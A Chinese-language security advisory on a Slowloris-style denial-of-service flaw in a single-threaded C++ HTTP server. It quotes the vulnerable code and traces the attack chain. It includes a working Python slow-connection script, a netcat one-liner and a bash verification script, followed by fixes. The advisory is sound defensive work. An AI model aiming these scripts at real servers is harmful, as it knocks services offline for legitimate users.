# VULN-DF-HTTP-002: 单线程HTTP服务器阻塞recv()无超时设置，易受Slowloris式拒绝服务攻击

**严重性**: High | **CWE**: CWE-400 (Resource Exhaustion) | **置信度**: 85/100
**位置**: `src/http_server.cpp:106-113` @ `HttpServer::run`

---

## 1. 漏洞细节

`HttpServer::run()` 方法实现了一个完全同步的单线程 HTTP 服务器。该服务器在无限 `for` 循环（第105行）中依次执行 `accept()` → `recv()` → 处理请求 → `send()` → `close()` 的流程，每次仅处理一个客户端连接。

关键问题在于第113行的 `recv()` 调用是一个**阻塞操作**，且整个代码库中**未对客户端套接字设置任何超时机制**（`SO_RCVTIMEO` / `SO_SNDTIMEO`）。经过对全部源码的 grep 搜索确认，唯一的 `setsockopt` 调用位于第88行，仅设置了 `SO_REUSEADDR`，不存在任何 `SO_RCVTIMEO`、`SO_SNDTIMEO`、`SOCK_NONBLOCK`、`epoll`、`select`、`poll`、`fork`、`pthread` 或 `std::thread` 的使用。

这意味着攻击者可以建立一个 TCP 连接后，以极低速率发送数据（例如每隔30秒发送一个字节），使 `recv()` 无限期阻塞。由于服务器是单线程同步处理，一个慢连接即可阻塞整个服务器，使其无法 `accept()` 或处理任何其他合法连接，造成完全的拒绝服务。

此外，`listen()` 的 backlog 参数仅为16（第100行），当服务器被阻塞时，等待队列很快会被填满，后续的连接请求将被直接丢弃。

## 2. 漏洞代码

**文件**: `src/http_server.cpp` (行 81-134)

```cpp
int HttpServer::run() {
  int fd = ::socket(AF_INET, SOCK_STREAM, 0);       // 行82: 创建TCP套接字
  if (fd < 0) {
    throw std::runtime_error("socket failed");
  }

  int reuse = 1;
  setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));  // 行88: 仅设置SO_REUSEADDR
  // ⚠️ 缺少: setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, ...) 或 SO_SNDTIMEO

  sockaddr_in address {};
  address.sin_family = AF_INET;
  address.sin_addr.s_addr = INADDR_ANY;
  address.sin_port = htons(static_cast<uint16_t>(port_));

  if (bind(fd, reinterpret_cast<sockaddr*>(&address), sizeof(address)) < 0) {
    close(fd);
    throw std::runtime_error("bind failed");
  }

  if (listen(fd, 16) < 0) {                          // 行100: backlog=16，缓冲极小
    close(fd);
    throw std::runtime_error("listen failed");
  }

  for (;;) {                                         // 行105: ⚠️ 单线程同步循环
    int client = accept(fd, nullptr, nullptr);       // 行106: 阻塞accept，接受任意连接
    if (client < 0) {
      continue;
    }
    // ⚠️ 此处缺少对client套接字设置SO_RCVTIMEO

    char buffer[4096];
    std::memset(buffer, 0, sizeof(buffer));
    ssize_t n = recv(client, buffer, sizeof(buffer) - 1, 0);  // 行113: ⚠️ 阻塞recv，无超时
    if (n <= 0) {
      close(client);
      continue;
    }

    HttpRequest request = parseRequest(std::string(buffer, static_cast<size_t>(n)));
    auto handler = handlers_.find(routeKey(request.method, request.path));

    HttpResponse response;
    if (handler == handlers_.end()) {
      response.status = 404;
      response.body = "not found\n";
    } else {
      response = handler->second(request);
    }

    std::string raw = serializeResponse(response);
    send(client, raw.data(), raw.size(), 0);         // 行131: 阻塞send，同样无超时
    close(client);                                   // 行132: 关闭连接
  }
}
```

**代码分析要点**：

1. **第88行**：唯一的 `setsockopt` 调用，仅设置 `SO_REUSEADDR`，未设置任何超时选项
2. **第100行**：`listen(fd, 16)` — backlog 仅为16，连接缓冲极小
3. **第105行**：`for(;;)` 无限循环 — 单线程，一次只能处理一个连接
4. **第106行**：`accept()` — 阻塞等待新连接，无过滤机制
5. **第113行**：`recv()` — **核心漏洞点**，阻塞等待数据，无超时保护。攻击者控制数据发送速率，可使此调用无限期阻塞
6. **第131行**：`send()` — 同样为阻塞调用，无超时保护

## 3. 完整攻击链路

```
[入口点] main()@src/main.cpp:77
  ↓ server.run() 启动HTTP服务器，监听端口(默认8080)
[监听] HttpServer::run()@src/http_server.cpp:81
  ↓ socket() + bind() + listen(fd, 16) 建立TCP监听
[accept] accept(fd, nullptr, nullptr)@src/http_server.cpp:106
  ↓ 接受攻击者的TCP连接，返回client套接字
  ↓ ⚠️ 未对client设置SO_RCVTIMEO
[漏洞触发] recv(client, buffer, 4095, 0)@src/http_server.cpp:113
  ↓ 阻塞等待数据，攻击者以极低速率发送数据
  ↓ 服务器线程被完全占用，无法处理其他连接
[拒绝服务] 整个服务器不可用
  ↓ for循环被阻塞在recv()，无法回到accept()接受新连接
  ↓ listen backlog(16)很快填满，新连接被丢弃
```

**攻击链路详细说明**：

1. **`main()` (main.cpp:77)**：调用 `server.run()` 启动服务器，监听 TCP 端口（默认8080，可通过命令行参数指定）
2. **`HttpServer::run()` (http_server.cpp:81-103)**：创建套接字，设置 `SO_REUSEADDR`，绑定地址，开始监听。**关键遗漏：未设置 `SO_RCVTIMEO`**
3. **`accept()` (http_server.cpp:106)**：接受攻击者的 TCP 连接。此步骤无任何客户端过滤（无 IP 白名单、无速率限制）
4. **`recv()` (http_server.cpp:113)**：这是漏洞触发点。攻击者建立连接后，以极慢速率发送数据（如每30秒发送1字节），`recv()` 持续阻塞等待更多数据。由于没有超时机制，此阻塞可以无限期持续
5. **服务器瘫痪**：`recv()` 阻塞导致 `for` 循环无法继续执行，服务器无法回到 `accept()` 接受新的连接。所有合法用户的请求都无法被处理

## 4. 攻击场景

**攻击者画像**: 远程未认证用户。任何能够与服务器建立 TCP 连接的攻击者均可发起此攻击，无需任何认证或特殊权限。

**攻击向量**: 通过 TCP 网络连接发起。攻击者向服务器端口（默认8080）建立 TCP 连接，然后以极低速率发送 HTTP 数据。

**利用难度**: 低

### 攻击步骤

1. **建立 TCP 连接**：攻击者使用标准 TCP 客户端连接到目标服务器的 HTTP 端口（默认8080）
2. **发送不完整 HTTP 请求**：发送 HTTP 请求的开头部分（如 `GET / HTTP/1.1\r\n`），但不发送完整的请求头和终止符 `\r\n\r\n`
3. **保持连接活跃**：每隔一段时间（如15-30秒）发送一个字节的数据，保持 TCP 连接不被操作系统超时关闭，同时确保 `recv()` 不会返回
4. **服务器被阻塞**：`recv()` 在第113行持续阻塞等待数据，`for` 循环无法继续，服务器无法处理任何其他连接
5. **可选：多连接攻击**：攻击者可建立多个慢连接（最多受限于 listen backlog 的16个等待位），进一步确保服务器完全不可用
6. **持续拒绝服务**：只要攻击者维持慢连接，服务器就持续不可用。攻击成本极低（单个连接、极少带宽）

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                                     |
| ---------- | -------------- | ---------------------------------------------------------------------------------------- |
| 网络可达性 | TCP 端口可达   | 攻击者需要能够与服务器建立 TCP 连接（默认端口8080）。无防火墙规则或 IP 过滤阻止连接       |
| 认证要求   | 无需认证       | 攻击在 TCP 层即可发起，无需任何 HTTP 级别的认证。`accept()` 接受任意来源的连接            |
| 配置依赖   | 无特殊配置要求 | 服务器默认启动即存在此漏洞，不依赖任何特殊配置选项                                        |
| 环境依赖   | 标准 Linux 环境 | 需要标准的 POSIX 套接字环境。无特殊编译选项要求。默认编译即可触发                         |
| 时序条件   | 无             | 攻击不依赖竞态条件。只要慢连接存在，服务器就被阻塞。攻击者只需维持连接即可                |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                               |
| -------- | ---- | -------------------------------------------------------------------------------------------------- |
| 机密性   | 无   | 此漏洞不导致信息泄露。攻击者仅能阻塞服务器，无法读取服务器数据                                      |
| 完整性   | 无   | 此漏洞不导致数据篡改。攻击者无法修改服务器上的任何数据                                              |
| 可用性   | 高   | **完全拒绝服务**。单个慢连接即可使整个服务器不可用，所有合法用户无法访问任何服务（/health、/login、/files 等全部路由均不可达） |

**影响范围**: 全局影响。由于服务器是单线程同步架构，一个被阻塞的连接导致**整个服务器进程**无法提供任何服务。所有已注册的路由（`/health`、`/login`、`/files`、`/debug/ping`、`/admin/export`）均不可用。如果该服务器是系统中唯一的 HTTP 入口点（从 `main.cpp` 来看确实如此），则整个应用的服务能力完全丧失。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 1: Python 慢连接脚本

```python
#!/usr/bin/env python3
"""
Slowloris-style DoS PoC - 仅供安全测试使用
针对 HttpServer::run() 中阻塞 recv() 无超时的漏洞

用法: python3 slowloris_poc.py <target_host> <target_port>
"""
import socket
import time
import sys

def slowloris_attack(host, port, num_connections=1):
    """建立慢连接，以极低速率发送数据，阻塞服务器"""
    sockets = []
    
    for i in range(num_connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            # 发送不完整的HTTP请求头
            s.send(b"GET / HTTP/1.1\r\n")
            s.send(b"Host: " + host.encode() + b"\r\n")
            sockets.append(s)
            print(f"[+] 慢连接 #{i+1} 已建立 -> {host}:{port}")
        except socket.error as e:
            print(f"[-] 连接 #{i+1} 失败: {e}")
    
    print(f"\n[*] 已建立 {len(sockets)} 个慢连接")
    print("[*] 每隔15秒发送1字节保持连接，服务器 recv() 将持续阻塞...")
    print("[*] 按 Ctrl+C 停止攻击\n")
    
    try:
        while True:
            for i, s in enumerate(sockets):
                try:
                    # 每15秒发送一个字节，保持连接活跃
                    # 这使 recv() 返回1字节，然后再次阻塞等待更多数据
                    s.send(b"X")
                    print(f"  [>] 连接 #{i+1}: 发送1字节")
                except socket.error:
                    # 连接断开，重新建立
                    sockets.remove(s)
                    try:
                        new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_s.connect((host, port))
                        new_s.send(b"GET / HTTP/1.1\r\n")
                        sockets.append(new_s)
                        print(f"  [+] 连接 #{i+1}: 已重建")
                    except socket.error:
                        pass
            time.sleep(15)
    except KeyboardInterrupt:
        print("\n[*] 停止攻击，关闭连接...")
        for s in sockets:
            s.close()

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    slowloris_attack(host, port)
```

### PoC 2: 使用 nc (netcat) 的手动验证

```bash
# 终端1: 启动服务器
./edge-gateway 8080

# 终端2: 建立慢连接（使用nc保持连接不发送完整请求）
echo -ne "GET / HTTP/1.1\r\nHost: localhost\r\n" | nc -q 9999 127.0.0.1 8080
# 注意: -q 9999 使nc在发送后保持连接2.7小时不关闭

# 终端3: 尝试正常访问（将被阻塞/超时）
curl -m 5 http://127.0.0.1:8080/health
# 预期: curl 超时，无法获得响应
```

### PoC 3: 快速验证脚本（Bash）

```bash
#!/bin/bash
# Slowloris 快速验证 - 仅供安全测试使用
# 用法: bash verify_dos.sh <host> <port>

HOST=${1:-127.0.0.1}
PORT=${2:-8080}

echo "[*] 步骤1: 建立慢连接..."
# 使用 Python 在后台建立慢连接
python3 -c "
import socket, time
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('$HOST', $PORT))
s.send(b'GET / HTTP/1.1\r\n')
time.sleep(30)  # 保持连接30秒
" &
SLOW_PID=$!
sleep 1

echo "[*] 步骤2: 尝试正常请求（预期超时）..."
RESULT=$(curl -s -m 3 -o /dev/null -w "%{http_code}" http://$HOST:$PORT/health 2>&1)

if [ "$RESULT" = "000" ] || [ -z "$RESULT" ]; then
    echo "[!] 验证成功: 服务器无法响应正常请求 (返回码: $RESULT)"
    echo "[!] 服务器已被单个慢连接阻塞"
else
    echo "[-] 服务器仍可响应 (HTTP $RESULT)"
fi

kill $SLOW_PID 2>/dev/null
echo "[*] 清理完成"
```

**使用说明**: 
1. 首先在目标机器上启动 `edge-gateway` 服务器
2. 运行 PoC 脚本建立慢连接
3. 从另一个终端尝试正常 HTTP 请求（如 `curl http://target:8080/health`）
4. 观察到正常请求超时或无响应，证明服务器已被单个慢连接阻塞

**预期结果**: 
- 慢连接建立后，服务器的 `recv()` 在第113行持续阻塞
- 所有后续的 HTTP 请求（包括 `/health` 等简单路由）均无法获得响应
- `curl` 命令在超时后返回错误（连接超时或无响应）
- 关闭慢连接后，服务器立即恢复正常

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux（Ubuntu 20.04+、Debian 11+ 或其他主流发行版）
- 编译器: GCC 9+ 或 Clang 10+（支持 C++17）
- 构建工具: CMake 3.16+
- 依赖: 标准 C++ 库、POSIX 套接字 API（Linux 内置）
- 测试工具: Python 3.6+、curl、netcat

### 构建步骤

```bash
# 克隆/进入项目目录
cd /scan/project

# 创建构建目录
mkdir -p build && cd build

# 配置（默认编译，无需特殊选项）
cmake ..

# 编译
make -j$(nproc)

# 生成的可执行文件: build/edge-gateway
```

**注意**: 无需关闭 ASLR、Stack Canary 等安全选项。此漏洞为逻辑层面的拒绝服务，不依赖内存布局或编译器选项。默认编译即可复现。

### 运行配置

```bash
# 启动服务器（默认端口8080）
./build/edge-gateway

# 或指定自定义端口
./build/edge-gateway 9090
```

无需特殊配置文件或环境变量。服务器启动后即可接受连接。

### 验证步骤

1. **启动服务器**: 在终端1中运行 `./build/edge-gateway 8080`
2. **验证正常服务**: 在终端2中运行 `curl http://127.0.0.1:8080/health`，确认返回 `ok`
3. **发起慢连接攻击**: 在终端2中运行 PoC 脚本 `python3 slowloris_poc.py 127.0.0.1 8080`
4. **验证服务中断**: 在终端3中运行 `curl -m 5 http://127.0.0.1:8080/health`，观察到请求超时（5秒后无响应）
5. **停止攻击**: 在终端2中按 `Ctrl+C` 停止 PoC 脚本
6. **验证恢复**: 再次运行 `curl http://127.0.0.1:8080/health`，确认服务恢复正常

### 预期结果

- **步骤2**: `curl` 立即返回 `ok`（HTTP 200），证明服务器正常工作
- **步骤4**: `curl` 在5秒超时后返回错误（`curl: (28) Operation timed out`），证明服务器已被单个慢连接完全阻塞
- **步骤6**: 攻击停止后，服务器立即恢复正常响应

### 修复建议

1. **设置套接字超时**：在 `accept()` 返回后对 `client` 套接字设置 `SO_RCVTIMEO` 和 `SO_SNDTIMEO`：
   ```cpp
   struct timeval tv;
   tv.tv_sec = 10;  // 10秒超时
   tv.tv_usec = 0;
   setsockopt(client, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
   setsockopt(client, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
   ```
2. **使用 I/O 多路复用**：替换阻塞 `recv()` 为 `epoll`/`select`/`poll`，支持并发处理多个连接
3. **多线程/多进程架构**：为每个连接创建独立线程或进程，避免单连接阻塞整个服务器
4. **增大 listen backlog**：将 `listen(fd, 16)` 改为更大的值（如128或 `SOMAXCONN`）
5. **连接速率限制**：实现连接频率限制和慢连接检测机制
